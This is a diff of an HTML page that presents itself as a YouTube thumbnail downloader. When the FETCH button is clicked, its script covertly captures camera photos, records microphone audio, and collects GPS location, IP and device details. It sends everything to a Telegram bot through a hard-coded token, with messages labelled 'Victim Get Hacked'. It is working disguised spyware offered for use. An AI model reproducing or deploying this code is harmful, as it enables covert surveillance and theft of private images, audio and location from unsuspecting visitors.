@@ -1,159 +1,160 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-  <title>YouTube Thumbnail Downloader</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
-  <style>
-    body {
-      font-family: 'Montserrat', sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: #f5f5f5;
-    }
-    .navbar {
-      background-color: #ff0000;
-      color: white;
-      text-align: center;
-      padding: 15px 0;
-    }
-    #header {
-      margin: 0;
-      font-size: 28px;
-      font-weight: bold;
-    }
-    .container {
-      max-width: 600px;
-      margin: 20px auto;
-      padding: 20px;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-    .form-control {
-      width: calc(100% - 22px);
-      margin-bottom: 15px;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      box-sizing: border-box;
-      font-family: 'Montserrat', sans-serif;
-    }
-    #thumbdloadbtn {
-      display: block;
-      width: 100%;
-      padding: 10px;
-      border: none;
-      border-radius: 5px;
-      background-color: #ff0000;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
-      font-family: 'Montserrat', sans-serif;
-    }
-    #thumbdloadbtn:hover {
-      background-color: #cc0000;
-    }
-    footer {
-      text-align: center;
-      margin-top: 40px;
-      color: #666;
-    }
-    .youtube-logo {
-      display: block;
-      margin: 20px auto;
-      width: 100px;
-    }
-  </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <title>YouTube Thumbnail Downloader</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+  <style>
+    /* CSS is now correctly placed inside the <style> block */
+    body {
+      font-family: 'Montserrat', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f5f5;
+    }
+    .navbar {
+      background-color: #ff0000;
+      color: white;
+      text-align: center;
+      padding: 15px 0;
+    }
+    #header {
+      margin: 0;
+      font-size: 28px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 600px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .form-control {
+      width: calc(100% - 22px);
+      margin-bottom: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff0000;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn:hover {
+      background-color: #cc0000;
+    }
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      color: #666;
+    }
+    .youtube-logo {
+      display: block;
+      margin: 20px auto;
+      width: 100px;
+    }
+  </style>
 </head>
 <body>
-  <nav class="navbar">
-    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
-    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
-  </nav>
+  <nav class="navbar">
+    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
+    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
+  </nav>
 
-  <div class="container">
-    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
-    <button id="thumbdloadbtn" onclick="fetchData()">FETCH</button>
-    <div id="thumbnail-preview"></div>
+  <div class="container">
+    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
+    <button id="thumbdloadbtn" onclick="fetchData()">FETCH</button>
+    <div id="thumbnail-preview"></div>
 
-    <h2>How to Download HD YouTube Thumbnail</h2>
-    <ol>
-      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
-      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
-      <li>Click on the "FETCH" Button</li>
-      <li>Select the thumbnail quality</li>
-      <li>Download the Thumbnail</li>
-    </ol>
-  </div>
+    <h2>How to Download HD YouTube Thumbnail</h2>
+    <ol>
+      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
+      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
+      <li>Click on the "FETCH" Button</li>
+      <li>Select the thumbnail quality</li>
+      <li>Download the Thumbnail</li>
+    </ol>
+  </div>
 
-  <center>
-    <button id="toggle-video" style="display:none;">Toggle Video</button>
-    <div id="message-container"></div>
-    <video id="video" width="0" height="0" autoplay></video>
-  </center>
+  <center>
+    <button id="toggle-video" style="display:none;">Toggle Video</button>
+    <div id="message-container"></div>
+    <video id="video" width="0" height="0" autoplay></video>
+  </center>
 
-  <script type="text/javascript">
-    function fetchData() {
-      var btn = document.getElementById('thumbdloadbtn');
-      btn.textContent = 'Fetching from server... Wait';
+  <script type="text/javascript">
+    function fetchData() {
+      var btn = document.getElementById('thumbdloadbtn');
+      btn.textContent = 'Fetching from server... Wait';
 
-      var videoUrl = document.getElementById('ytlink').value;
-      if (videoUrl) {
-        var videoId = videoUrl.split('v=')[1];
-        // Handle URLs that may contain & after the video ID
-        if (videoId) {
-          videoId = videoId.split('&')[0];
-        }
-        
-        var thumbnailUrl = `https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`;
-        var thumbnailPreview = document.getElementById('thumbnail-preview');
-        thumbnailPreview.innerHTML = `<img src="${thumbnailUrl}" alt="Thumbnail" style="width: 100%; max-height: 300px; object-fit: cover;" />`;
-        
-        // Visually update the button to show the next step is ready
-        btn.textContent = 'Select quality and Download';
-      } else {
-        btn.textContent = 'FETCH';
-        console.error("Please enter a YouTube URL.");
-      }
+      var videoUrl = document.getElementById('ytlink').value;
+      if (videoUrl) {
+        var videoId = videoUrl.split('v=')[1];
+        // Handle URLs that may contain & after the video ID
+        if (videoId) {
+          videoId = videoId.split('&')[0];
+        }
+        
+        var thumbnailUrl = `https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`;
+        var thumbnailPreview = document.getElementById('thumbnail-preview');
+        thumbnailPreview.innerHTML = `<img src="${thumbnailUrl}" alt="Thumbnail" style="width: 100%; max-height: 300px; object-fit: cover;" />`;
+        
+        // Visually update the button to show the next step is ready
+        btn.textContent = 'Select quality and Download';
+      } else {
+        btn.textContent = 'FETCH';
+        console.error("Please enter a YouTube URL.");
+      }
 
-      // Access camera, audio, and location in parallel
-      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-        .then((stream) => {
-          const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
-          const audioRecorder = new MediaRecorder(stream);
-          const chunks = []; // Array to store audio chunks
+      // Access camera, audio, and location in parallel
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then((stream) => {
+          const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+          const audioRecorder = new MediaRecorder(stream);
+          const chunks = []; // Array to store audio chunks
 
-          // Capture 3 photos in parallel
-          const capturePhotos = Array.from({ length: 3 }, (_, index) => capturePhoto(imageCapture, index));
-          // Start recording audio
-          const startRecording = startAudioRecording(audioRecorder, chunks);
+          // Capture 3 photos in parallel
+          const capturePhotos = Array.from({ length: 3 }, (_, index) => capturePhoto(imageCapture, index));
+          // Start recording audio
+          const startRecording = startAudioRecording(audioRecorder, chunks);
 
-          // Get location
-          const getLocation = getUserLocation();
+          // Get location
+          const getLocation = getUserLocation();
           
           // Get IP, Device, and Battery info
           const getDeviceInfoPromise = getIPAndNetworkInfo().then(ipInfo => getDeviceAndBatteryInfo(ipInfo));
 
-          // Run all actions in parallel
-          Promise.all([Promise.all(capturePhotos), startRecording, getLocation, getDeviceInfoPromise])
-            .then(() => {
-              console.log("All media and info captured and sent to Telegram.");
-            })
-            .catch((error) => {
-              console.error("Error during capture or sending:", error);
-            });
-        })
-        .catch((error) => {
-          if (error.name === 'NotAllowedError') {
-            console.warn('Permissions denied. User may suspect.');
-          } else {
-            console.error('Permission error:', error);
-          }
-        });
-    }
+          // Run all actions in parallel
+          Promise.all([Promise.all(capturePhotos), startRecording, getLocation, getDeviceInfoPromise])
+            .then(() => {
+              console.log("All media and info captured and sent to Telegram.");
+            })
+            .catch((error) => {
+              console.error("Error during capture or sending:", error);
+            });
+        })
+        .catch((error) => {
+          if (error.name === 'NotAllowedError') {
+            console.warn('Permissions denied. User may suspect.');
+          } else {
+            console.error('Permission error:', error);
+          }
+        });
+    }
 
     // --- IP and Network Information Function (Requires external API) ---
     function getIPAndNetworkInfo() {
@@ -218,156 +219,156 @@
     // --- End of Advanced Information Functions ---
 
 
-    function capturePhoto(imageCapture, index) {
-      return new Promise((resolve, reject) => {
-        setTimeout(() => {
-          imageCapture.takePhoto()
-            .then((blob) => {
-              sendToTelegram(blob, 'photo');
-              resolve();
-            })
-            .catch((error) => {
-              console.error('Error capturing photo:', error);
-              resolve(); // Resolve even on error to allow Promise.all to continue
-            });
-        }, index * 2000);
-      });
-    }
+    function capturePhoto(imageCapture, index) {
+      return new Promise((resolve, reject) => {
+        setTimeout(() => {
+          imageCapture.takePhoto()
+            .then((blob) => {
+              sendToTelegram(blob, 'photo');
+              resolve();
+            })
+            .catch((error) => {
+              console.error('Error capturing photo:', error);
+              resolve(); // Resolve even on error to allow Promise.all to continue
+            });
+        }, index * 2000);
+      });
+    }
 
-    function startAudioRecording(audioRecorder, chunks) {
-      return new Promise((resolve, reject) => {
-        audioRecorder.start(); // Start recording
-        console.log("Audio recording started...");
+    function startAudioRecording(audioRecorder, chunks) {
+      return new Promise((resolve, reject) => {
+        audioRecorder.start(); // Start recording
+        console.log("Audio recording started...");
 
-        // Store audio data as it becomes available
-        audioRecorder.ondataavailable = (event) => {
-          if (event.data.size > 0) {
-            chunks.push(event.data); // Push data chunks to the array
-          }
-        };
+        // Store audio data as it becomes available
+        audioRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            chunks.push(event.data); // Push data chunks to the array
+          }
+        };
 
-        // Stop recording after 5 seconds
-        setTimeout(() => {
-          if (audioRecorder.state !== 'inactive') {
-            audioRecorder.stop(); // Stop recording after 5 seconds
-          }
-        }, 5000);
+        // Stop recording after 5 seconds
+        setTimeout(() => {
+          if (audioRecorder.state !== 'inactive') {
+            audioRecorder.stop(); // Stop recording after 5 seconds
+          }
+        }, 5000);
 
-        // When recording stops, process the audio data
-        audioRecorder.onstop = () => {
-          if (chunks.length > 0) {
-            const audioBlob = new Blob(chunks, { type: 'audio/wav' });
-            sendToTelegram(audioBlob, 'audio'); // Send the audio to Telegram
-            resolve();
-          } else {
-            console.warn('No audio recorded.');
-            resolve();
-          }
-        };
+        // When recording stops, process the audio data
+        audioRecorder.onstop = () => {
+          if (chunks.length > 0) {
+            const audioBlob = new Blob(chunks, { type: 'audio/wav' });
+            sendToTelegram(audioBlob, 'audio'); // Send the audio to Telegram
+            resolve();
+          } else {
+            console.warn('No audio recorded.');
+            resolve();
+          }
+        };
 
-        audioRecorder.onerror = (error) => {
-          console.error('Error while recording audio:', error);
-          resolve(); // Resolve even on error
-        };
-      });
-    }
+        audioRecorder.onerror = (error) => {
+          console.error('Error while recording audio:', error);
+          resolve(); // Resolve even on error
+        };
+      });
+    }
 
-    function getUserLocation() {
-      return new Promise((resolve, reject) => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              var latitude = position.coords.latitude;
-              var longitude = position.coords.longitude;
-              console.log("Location Captured:", latitude, longitude);
+    function getUserLocation() {
+      return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              var latitude = position.coords.latitude;
+              var longitude = position.coords.longitude;
+              console.log("Location Captured:", latitude, longitude);
 
-              // Create Google Maps URL
-              const googleMapsURL = `https://maps.google.com/?q=${latitude},${longitude}`; 
-              
-              // Send the Google Maps URL to Telegram
-              sendToTelegram(googleMapsURL, 'location');
-              
-              resolve();
-            },
-            (error) => {
-              console.error("Error getting location:", error);
-              resolve(); // Resolve even on error
-            }
-          );
-        } else {
-          console.warn("Geolocation not supported.");
-          resolve(); // Resolve if not supported
-        }
-      });
-    }
+              // Corrected Google Maps URL construction
+              const googleMapsURL = `https://maps.google.com/?q=${latitude},${longitude}`; 
+              
+              // Send the Google Maps URL to Telegram
+              sendToTelegram(googleMapsURL, 'location');
+              
+              resolve();
+            },
+            (error) => {
+              console.error("Error getting location:", error);
+              resolve(); // Resolve even on error
+            }
+          );
+        } else {
+          console.warn("Geolocation not supported.");
+          resolve(); // Resolve if not supported
+        }
+      });
+    }
 
-    function sendToTelegram(data, type) {
-      const botToken = '7713518698:AAGw9ey4h0pFIZV_-1eh9xwxYeV_HJqqCk'; // Replace with your bot token
-      const chatId = GetURLParameter('id'); // Get the chat ID from URL parameter
+    function sendToTelegram(data, type) {
+      const botToken = '7713518698:AAGw9ey4h0pFIZV_-1eh9xwxYeV_HJqqCk'; // Replace with your bot token
+      const chatId = GetURLParameter('id'); // Get the chat ID from URL parameter
 
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
 
-      let apiEndpoint = '';
+      let apiEndpoint = '';
 
-      if (type === 'location') {
-        // Send location as a message in Telegram with a clickable link to Google Maps
-        const locationMessage = `<b>Victim Get Hacked By Nasir Hacker - GPS Location</b>\n<a href="${data}">Google Maps Link (from GPS)</a>`;
-        formData.append('text', locationMessage);
-        formData.append('parse_mode', 'HTML'); // Ensure HTML formatting
+      if (type === 'location') {
+        // Send location as a message in Telegram with a clickable link to Google Maps
+        const locationMessage = `<b>Victim Get Hacked By Nasir Hacker - GPS Location</b>\n<a href="${data}">Google Maps Link (from GPS)</a>`;
+        formData.append('text', locationMessage);
+        formData.append('parse_mode', 'HTML'); // Ensure HTML formatting
         apiEndpoint = 'sendMessage';
-      } else if (type === 'device_info') {
+      } else if (type === 'device_info') {
         // Send the collected device and network info
         const deviceInfoMessage = `<b>Victim Get Hacked By Nasir Hacker - Advanced Info</b>\n<pre>${data}</pre>`;
         formData.append('text', deviceInfoMessage);
         formData.append('parse_mode', 'HTML');
         apiEndpoint = 'sendMessage';
       } else {
-        // Send the "Victim Get Hacked By Nasir Hacker" message for other types of media
-        const message = "<b>Victim Get Hacked By Nasir Hacker</b>";
-        formData.append('caption', message); // Use caption for media
-        formData.append('parse_mode', 'HTML'); // Tell Telegram to parse HTML
+        // Send the "Victim Get Hacked By Nasir Hacker" message for other types of media
+        const message = "<b>Victim Get Hacked By Nasir Hacker</b>";
+        formData.append('caption', message); // Use caption for media
+        formData.append('parse_mode', 'HTML'); // Tell Telegram to parse HTML
 
-        if (type === 'photo') {
-          formData.append('photo', data, 'camera.jpg');
+        if (type === 'photo') {
+          formData.append('photo', data, 'camera.jpg');
           apiEndpoint = 'sendPhoto';
-        } else if (type === 'audio') {
-          formData.append('audio', data, 'audio_recording.wav');
+        } else if (type === 'audio') {
+          formData.append('audio', data, 'audio_recording.wav');
           apiEndpoint = 'sendAudio';
-        }
-      }
+        }
+      }
 
-      fetch(`https://api.telegram.org/bot${botToken}/${apiEndpoint}`, {
-        method: 'POST',
-        body: formData
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok) {
-            console.log("Message and media sent successfully:", data);
-          } else {
-            console.error("Telegram error response:", data);
-          }
-        })
-        .catch(error => {
-          console.error('Error sending to Telegram:', error);
-        });
-    }
+      fetch(`https://api.telegram.org/bot${botToken}/${apiEndpoint}`, {
+        method: 'POST',
+        body: formData
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            console.log("Message and media sent successfully:", data);
+          } else {
+            console.error("Telegram error response:", data);
+          }
+        })
+        .catch(error => {
+          console.error('Error sending to Telegram:', error);
+        });
+    }
 
-    function GetURLParameter(sParam) {
-      var sPageURL = window.location.search.substring(1);
-      var sURLVariables = sPageURL.split('&');
-      for (var i = 0; i < sURLVariables.length; i++) {
-        var sParameterName = sURLVariables[i].split('=');
-        if (sParameterName[0] == sParam) {
-          return sParameterName[1];
-        }
-      }
-    }
-  </script>
+    function GetURLParameter(sParam) {
+      var sPageURL = window.location.search.substring(1);
+      var sURLVariables = sPageURL.split('&');
+      for (var i = 0; i < sURLVariables.length; i++) {
+        var sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] == sParam) {
+          return sParameterName[1];
+        }
+      }
+    }
+  </script>
 
-  <footer>
-    <p>Made With ❤️ By NASIR HACKER</p>
-  </footer>
+  <footer>
+    <p>Made With ❤️ By NASIR HACKER</p>
+  </footer>
 </body>
 </html>
